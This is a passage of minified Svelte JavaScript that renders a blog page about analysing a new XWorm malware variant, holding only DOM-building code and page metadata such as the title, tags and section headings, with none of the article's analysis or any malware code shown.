Q(!1),Cl=f(),xs=d("p"),xs.textContent=il,on=f(),cl=new Q(!1),pn=f(),ys=d("p"),ys.innerHTML=yl,Fn=f(),ds=d("h2"),ds.innerHTML=vs,rn=f(),Ms=d("p"),Ms.innerHTML=zs,cn=f(),$s=d("p"),$s.textContent=dl,this.h()},l(r){s=y(r,"H2",{id:!0,"data-svelte-h":!0}),E(s)!=="svelte-ccveyw"&&(s.innerHTML=e),a=u(r),l=y(r,"P",{"data-svelte-h":!0}),E(l)!=="svelte-l0ad4k"&&(l.textContent=t),p=u(r),h=y(r,"P",{"data-svelte-h":!0}),E(h)!=="svelte-kka84p"&&(h.innerHTML=v),b=u(r),T=y(r,"H2",{id:!0,"data-svelte-h":!0}),E(T)!=="svelte-143uk5j"&&(T.innerHTML=R),C=u(r),w=y(r,"P",{"data-svelte-h":!0}),E(w)!=="svelte-guxtjo"&&(w.innerHTML=k),D=u(r),x=K(r,!1),A=u(r),_=y(r,"P",{"data-svelte-h":!0}),E(_)!=="svelte-1h3vs2a"&&(_.innerHTML=H),j=u(r),O=y(r,"P",{});var g=L(O);V(S.$$.fragment,g),g.forEach(n),I=u(r),as=y(r,"P",{"data-svelte-h":!0}),E(as)!=="svelte-gqvjlb"&&(as.innerHTML=Ks),J=u(r),ms=y(r,"P",{});var Wn=L(ms);V(gs.$$.fragment,Wn),Wn.forEach(n),_s=u(r),Qs=y(r,"P",{"data-svelte-h":!0}),E(Qs)!=="svelte-18du20p"&&(Qs.textContent=Bl),Es=u(r),Ys=K(r,!1),El=u(r),bs=y(r,"P",{"data-svelte-h":!0}),E(bs)!=="svelte-rqfhvz"&&(bs.innerHTML=bl),wn=u(r),es=y(r,"H2",{id:!0,"data-svelte-h":!0}),E(es)!=="svelte-1wjvziz"&&(es.innerHTML=Zs),Il=u(r),ws=y(r,"P",{"data-svelte-h":!0}),E(ws)!=="svelte-172y4m2"&&(ws.innerHTML=Bs),Pl=u(r),Xs=K(r,!1),wl=u(r),Ds=y(r,"P",{"data-svelte-h":!0}),E(Ds)!=="svelte-5hhyp2"&&(Ds.textContent=Js),Rl=u(r),Is=y(r,"P",{});var kl=L(Is);V(ss.$$.fragment,kl),kl.forEach(n),Ol=u(r),Ls=y(r,"P",{"data-svelte-h":!0}),E(Ls)!=="svelte-nu44gi"&&(Ls.innerHTML=Dl),Dn=u(r),os=y(r,"P",{"data-svelte-h":!0}),E(os)!=="svelte-1y662yu"&&(os.innerHTML=sl),Nl=u(r),ts=y(r,"H2",{id:!0,"data-svelte-h":!0}),E(ts)!=="svelte-1akbftj"&&(ts.innerHTML=Ll),Ln=u(r),ps=y(r,"P",{"data-svelte-h":!0}),E(ps)!=="svelte-12llahp"&&(ps.innerHTML=Ps),Ul=u(r),Y=y(r,"IMG",{src:!0,alt:!0,width:!0,style:!0}),Wl=u(r),Ts=y(r,"P",{"data-svelte-h":!0}),E(Ts)!=="svelte-ma4w3b"&&(Ts.innerHTML=Tl),Tn=u(r),Fs=y(r,"P",{"data-svelte-h":!0}),E(Fs)!=="svelte-1v50k1f"&&(Fs.innerHTML=nl),Vl=u(r),Rs=y(r,"P",{});var vl=L(Rs);V(ls.$$.fragment,vl),vl.forEach(n),jl=u(r),As=y(r,"P",{"data-svelte-h":!0}),E(As)!=="svelte-23ztk8"&&(As.innerHTML=el),zl=u(r),Os=y(r,"P",{});var Bn=L(Os);V(Z.$$.fragment,Bn),Bn.forEach(n),Gl=u(r),Cs=y(r,"P",{"data-svelte-h":!0}),E(Cs)!=="svelte-yzv1ld"&&(Cs.innerHTML=al),ql=u(r),ol=K(r,!1),Ql=u(r),rs=y(r,"P",{"data-svelte-h":!0}),E(rs)!=="svelte-v92x8g"&&(rs.innerHTML=tl),Yl=u(r),Ns=y(r,"P",{});var dn=L(Ns);V(q.$$.fragment,dn),dn.forEach(n),Zl=u(r),is=y(r,"H2",{id:!0,"data-svelte-h":!0}),E(is)!=="svelte-bjozqq"&&(is.innerHTML=Us),Xl=u(r),ks=y(r,"P",{"data-svelte-h":!0}),E(ks)!=="svelte-1nxiwqm"&&(ks.textContent=pl),Jl=u(r),Fl=K(r,!1),ln=u(r),cs=y(r,"P",{"data-svelte-h":!0}),E(cs)!=="svelte-1dnjm7i"&&(cs.innerHTML=rl),nn=u(r),Ws=y(r,"P",{});var ul=L(Ws);V(X.$$.fragment,ul),ul.forEach(n),en=u(r),Vs=y(r,"P",{});var In=L(Vs);V(ns.$$.fragment,In),In.forEach(n),an=u(r),Ss=y(r,"P",{"data-svelte-h":!0}),E(Ss)!=="svelte-y5a8fg"&&(Ss.textContent=Al),An=u(r),js=K(r,!1),Cl=u(r),xs=y(r,"P",{"data-svelte-h":!0}),E(xs)!=="svelte-sv5aos"&&(xs.textContent=il),on=u(r),cl=K(r,!1),pn=u(r),ys=y(r,"P",{"data-svelte-h":!0}),E(ys)!=="svelte-3hipc8"&&(ys.innerHTML=yl),Fn=u(r),ds=y(r,"H2",{id:!0,"data-svelte-h":!0}),E(ds)!=="svelte-kmpttn"&&(ds.innerHTML=vs),rn=u(r),Ms=y(r,"P",{"data-svelte-h":!0}),E(Ms)!=="svelte-20trsz"&&(Ms.innerHTML=zs),cn=u(r),$s=y(r,"P",{"data-svelte-h":!0}),E($s)!=="svelte-tpm7dn"&&($s.textContent=dl),this.h()},h(){m(s,"id","introduction"),m(T,"id","first-sign-of-malicious-code"),x.a=A,Ys.a=El,m(es,"id","new-language-old-friend"),Xs.a=wl,m(ts,"id","decompiling-the-culprit"),kn(Y.src,ll="malware.png")||m(Y,"src",ll),m(Y,"alt","Malware Image"),m(Y,"width","500"),qs(Y,"display","block"),qs(Y,"margin-left","auto"),qs(Y,"margin-right","auto"),ol.a=Ql,m(is,"id","searching-for-keys"),Fl.a=ln,js.a=Cl,cl.a=pn,m(ds,"id","conclusion")},m(r,g){F(r,s,g),F(r,a,g),F(r,l,g),F(r,p,g),F(r,h,g),F(r,b,g),F(r,T,g),F(r,C,g),F(r,w,g),F(r,D,g),x.m(P,r,g),F(r,A,g),F(r,_,g),F(r,j,g),F(r,O,g),W(S,O,null),F(r,I,g),F(r,as,g),F(r,J,g),F(r,ms,g),W(gs,ms,null),F(r,_s,g),F(r,Qs,g),F(r,Es,g),Ys.m(fl,r,g),F(r,El,g),F(r,bs,g),F(r,wn,g),F(r,es,g),F(r,Il,g),F(r,ws,g),F(r,Pl,g),Xs.m(hl,r,g),F(r,wl,g),F(r,Ds,g),F(r,Rl,g),F(r,Is,g),W(ss,Is,null),F(r,Ol,g),F(r,Ls,g),F(r,Dn,g),F(r,os,g),F(r,Nl,g),F(r,ts,g),F(r,Ln,g),F(r,ps,g),F(r,Ul,g),F(r,Y,g),F(r,Wl,g),F(r,Ts,g),F(r,Tn,g),F(r,Fs,g),F(r,Vl,g),F(r,Rs,g),W(ls,Rs,null),F(r,jl,g),F(r,As,g),F(r,zl,g),F(r,Os,g),W(Z,Os,null),F(r,Gl,g),F(r,Cs,g),F(r,ql,g),ol.m(Kl,r,g),F(r,Ql,g),F(r,rs,g),F(r,Yl,g),F(r,Ns,g),W(q,Ns,null),F(r,Zl,g),F(r,is,g),F(r,Xl,g),F(r,ks,g),F(r,Jl,g),Fl.m(sn,r,g),F(r,ln,g),F(r,cs,g),F(r,nn,g),F(r,Ws,g),W(X,Ws,null),F(r,en,g),F(r,Vs,g),W(ns,Vs,null),F(r,an,g),F(r,Ss,g),F(r,An,g),js.m(ml,r,g),F(r,Cl,g),F(r,xs,g),F(r,on,g),cl.m(tn,r,g),F(r,pn,g),F(r,ys,g),F(r,Fn,g),F(r,ds,g),F(r,rn,g),F(r,Ms,g),F(r,cn,g),F(r,$s,g),yn=!0},p:Hs,i(r){yn||($(S.$$.fragment,r),$(gs.$$.fragment,r),$(ss.$$.fragment,r),$(ls.$$.fragment,r),$(Z.$$.fragment,r),$(q.$$.fragment,r),$(X.$$.fragment,r),$(ns.$$.fragment,r),yn=!0)},o(r){B(S.$$.fragment,r),B(gs.$$.fragment,r),B(ss.$$.fragment,r),B(ls.$$.fragment,r),B(Z.$$.fragment,r),B(q.$$.fragment,r),B(X.$$.fragment,r),B(ns.$$.fragment,r),yn=!1},d(r){r&&(n(s),n(a),n(l),n(p),n(h),n(b),n(T),n(C),n(w),n(D),x.d(),n(A),n(_),n(j),n(O),n(I),n(as),n(J),n(ms),n(_s),n(Qs),n(Es),Ys.d(),n(El),n(bs),n(wn),n(es),n(Il),n(ws),n(Pl),Xs.d(),n(wl),n(Ds),n(Rl),n(Is),n(Ol),n(Ls),n(Dn),n(os),n(Nl),n(ts),n(Ln),n(ps),n(Ul),n(Y),n(Wl),n(Ts),n(Tn),n(Fs),n(Vl),n(Rs),n(jl),n(As),n(zl),n(Os),n(Gl),n(Cs),n(ql),ol.d(),n(Ql),n(rs),n(Yl),n(Ns),n(Zl),n(is),n(Xl),n(ks),n(Jl),Fl.d(),n(ln),n(cs),n(nn),n(Ws),n(en),n(Vs),n(an),n(Ss),n(An),js.d(),n(Cl),n(xs),n(on),cl.d(),n(pn),n(ys),n(Fn),n(ds),n(rn),n(Ms),n(cn),n($s)),N(S),N(gs),N(ss),N(ls),N(Z),N(q),N(X),N(ns)}}}function Oa(i){let s,e;const a=[i[0],ie];let l={$$slots:{default:[Ra]},$$scope:{ctx:i}};for(let t=0;t<a.length;t+=1)l=_l(l,a[t]);return s=new ye({props:l}),{c(){U(s.$$.fragment)},l(t){V(s.$$.fragment,t)},m(t,p){W(s,t,p),e=!0},p(t,[p]){const h=p&1?ce(a,[p&1&&Hn(t[0]),p&0&&Hn(ie)]):{};p&2&&(h.$$scope={dirty:p,ctx:t}),s.$set(h)},i(t){e||($(s.$$.fragment,t),e=!0)},o(t){B(s.$$.fragment,t),e=!1},d(t){N(s,t)}}}const ie={title:"Hunting in the wild - XWorm new variant",image:"/xworm-malware-analysis/xworm-p.png",alt:"Urara",created:"2024-02-17T00:00:00.000Z",updated:"2024-02-17T00:00:00.000Z",tags:["Malware Analysis","XWorm"],images:[],slug:"/xworm-malware-analysis/+page.svelte.md",path:"/blog/xworm-malware-analysis",toc:[{depth:2,slug:"introduction",title:"Introduction"},{depth:2,slug:"first-sign-of-malicious-code",title:"First sign of malicious code"},{depth:2,slug:"new-language-old-friend",title:"New language, old friend"},{depth:2,slug:"decompiling-the-culprit",title:"Decompiling the culprit"},{depth:2,slug:"searching-for-keys",title:"Searching for keys?"},{depth:2,slug:"conclusion",title:"Conclusion"}]},{title:wo,image:Do,alt:Lo,created:To,updated:Ao,tags:Co,audio:ko,images:So,lang:xo,video:Mo,slug:$o,path:Ho,toc:Bo}=ie;function Na(i,s,e){return i.$$set=a=>{e(0,s=_l(_l({},s),$n(a)))},s=$n(s),[s]}class Io extends us{constructor(s){super(),fs(this,s,Na,Oa,hs,{})}}const Ua=i=>i.title?"article":i.image?"photo":i.audio?"audio":i.video?"video":i.bookmark_of?"bookmark":i.like_of?"like":i.repost_of?"repost":i.in_reply_to?"reply":"note",Po=i=>[...new Set(i.reduce((s,e)=>e.tags?[...s,...e.tags]:s,[""]).slice(1))];export{oo as P,Eo as a,Io as b,Po as g};
